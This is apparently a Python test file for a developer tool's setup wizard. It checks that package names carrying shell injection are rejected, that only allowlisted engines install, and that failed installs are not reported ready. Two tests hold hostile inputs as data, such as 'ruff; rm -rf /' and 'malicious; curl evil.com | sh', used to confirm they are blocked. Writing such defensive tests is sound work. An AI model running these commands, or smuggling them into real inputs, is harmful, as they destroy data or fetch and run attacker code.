"""Tests for Phase 23: Setup Wizard and Config Initializer.

Verifies:
- Command injection neutralization in package installation
- Package name regex sanitization (rejection of shell metacharacters)
- Generating rush.toml configuration files
- Validating configuration files via config check
- Phase 65 P65-02: the --install path is actually reachable, engines install
  under their canonical registry package identity, unknown engines are
  refused, and a failed install never reports ready.
"""

from __future__ import annotations

import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest
from click.testing import CliRunner

from rush.cli import cli
from rush.config import load_config
from rush.permissions import ExecutionPermissions
from rush.setup.engine_packages import (
    ENGINE_PACKAGES,
    UnknownEngineError,
    resolve_engine_package,
)
from rush.setup.provision import build_provision_plan
from rush.tools.init_config import generate_initial_config
from rush.tools.setup_wizard import (
    PACKAGE_NAME_REGEX,
    install_engine_package,
    run_setup_wizard,
)


def test_package_name_regex_sanitization() -> None:
    # Valid package names
    assert PACKAGE_NAME_REGEX.match("ruff")
    assert PACKAGE_NAME_REGEX.match("@biomejs/biome")
    assert PACKAGE_NAME_REGEX.match("eslint-plugin-react")
    assert PACKAGE_NAME_REGEX.match("pytest_mock")

    # Hostile / injection package names
    assert not PACKAGE_NAME_REGEX.match("ruff; rm -rf /")
    assert not PACKAGE_NAME_REGEX.match("ruff && calc.exe")
    assert not PACKAGE_NAME_REGEX.match("`whoami`")
    assert not PACKAGE_NAME_REGEX.match("pkg | bash")
    assert not PACKAGE_NAME_REGEX.match("pkg > output.txt")


def test_install_engine_package_rejection(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="Invalid or hostile package name"):
        install_engine_package("npm", "malicious; curl evil.com | sh", cwd=tmp_path)


def test_install_engine_package_mock(tmp_path: Path) -> None:
    import subprocess

    with patch(
        "rush.tools.setup_wizard.run_subprocess",
        return_value=subprocess.CompletedProcess(
            args=[], returncode=0, stdout="installed", stderr=""
        ),
    ):
        success = install_engine_package("uv", "ruff", cwd=tmp_path)
        assert success is True


def test_generate_initial_config(tmp_path: Path) -> None:
    # Create Python project markers
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="demo"\n', encoding="utf-8"
    )

    cfg_text = generate_initial_config(tmp_path)
    assert "[project]" in cfg_text
    assert "src" in cfg_text

    # Write and load to verify parse validity
    cfg_file = tmp_path / "rush.toml"
    cfg_file.write_text(cfg_text, encoding="utf-8")

    parsed = load_config(tmp_path)
    assert parsed.project.src == ["src"]


def test_setup_install_reachable(tmp_path: Path) -> None:
    """The `rush setup --install` CLI path must actually be reachable.

    Before P65-02 the only flag was `--non-interactive` as an is_flag with
    default=True, which could never be turned off from the CLI -- the
    interactive install branch was unreachable. `--install` must build (and,
    with grants, apply) a real provision plan.
    """
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="demo"\n', encoding="utf-8"
    )

    runner = CliRunner()
    result = runner.invoke(cli, ["setup", str(tmp_path), "--install", "--json"])
    assert result.exit_code == 0, result.output
    assert '"plan_id"' in result.output
    assert '"provision"' in result.output


def test_biome_and_typescript_use_canonical_packages() -> None:
    """Engine installs must use the canonical registry package identity.

    Not the bare executable name -- `biome`'s installable identity is
    `@biomejs/biome` and `tsc`'s is `typescript`.
    """
    assert ENGINE_PACKAGES["biome"].package_id == "@biomejs/biome"
    assert ENGINE_PACKAGES["biome"].source == "npm"
    assert ENGINE_PACKAGES["tsc"].package_id == "typescript"
    assert ENGINE_PACKAGES["tsc"].source == "npm"


def test_install_refuses_unknown_engine(tmp_path: Path) -> None:
    """An engine outside the declared ENGINE_PACKAGES allowlist is rejected.

    Never installed under an arbitrary/invented package name.
    """
    with pytest.raises(UnknownEngineError):
        resolve_engine_package("totally-made-up-engine")

    with pytest.raises(UnknownEngineError):
        build_provision_plan(tmp_path, ["totally-made-up-engine"])

    # A wizard-recommended engine outside the allowlist is silently excluded
    # from the plan, never attempted as an arbitrary package.
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="demo"\n', encoding="utf-8"
    )
    result = run_setup_wizard(tmp_path, non_interactive=True, install=True)
    assert "bandit" in result["unsupported_engines"]


def test_failed_install_never_reports_ready(tmp_path: Path) -> None:
    """A failing post-install probe must never be reported as installed/ready."""
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="demo"\n', encoding="utf-8"
    )

    def fake_http_get(url: str) -> bytes:
        import json

        return json.dumps(
            {
                "info": {"version": "1.0.0"},
                "releases": {
                    "1.0.0": [
                        {
                            "packagetype": "bdist_wheel",
                            "url": "https://pypi/x.whl",
                            "digests": {"sha256": "abc"},
                        }
                    ]
                },
            }
        ).encode()

    def fake_runner(
        argv: list[str], env: dict[str, str] | None = None
    ) -> subprocess.CompletedProcess[str]:
        return subprocess.CompletedProcess(argv, 0, stdout="installed", stderr="")

    def failing_prober(argv: list[str]) -> subprocess.CompletedProcess[str]:
        return subprocess.CompletedProcess(argv, 1, stdout="", stderr="not found")

    perms = ExecutionPermissions(network=True, download=True, cache_write=True)
    result = run_setup_wizard(
        tmp_path,
        non_interactive=True,
        install=True,
        permissions=perms,
        http_get=fake_http_get,
        runner=fake_runner,
        prober=failing_prober,
    )
    assert result["provision"]["applied"] == []
    assert result["installed"] == []
    assert all(
        entry["code"] == "ENGINE_PROTOCOL_MISMATCH"
        for entry in result["provision"]["failed"].values()
    )
